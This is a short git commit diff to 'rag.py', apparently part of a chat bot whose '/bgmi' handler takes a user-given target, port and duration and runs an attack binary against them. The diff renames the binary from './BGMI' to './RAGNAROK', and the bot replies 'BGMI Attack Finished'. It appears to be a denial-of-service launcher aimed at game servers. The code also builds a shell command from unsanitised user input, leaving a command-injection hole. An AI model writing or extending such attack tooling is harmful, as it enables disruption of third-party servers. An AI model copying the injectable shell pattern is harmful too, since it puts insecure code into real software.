fc9947ccfaca9943de1e650d7b57b9e6959e61c9
ivonic099 <glitchv97@gmail.com>
2025-03-05 05:49:10 +0530

    Update rag.py

--- rag.py
+++ rag.py
@@ -239,7 +239,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./BGMI {target} {port} {time} 900"
+                full_command = f"./RAGNAROK {target} {port} {time} CRACKS"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
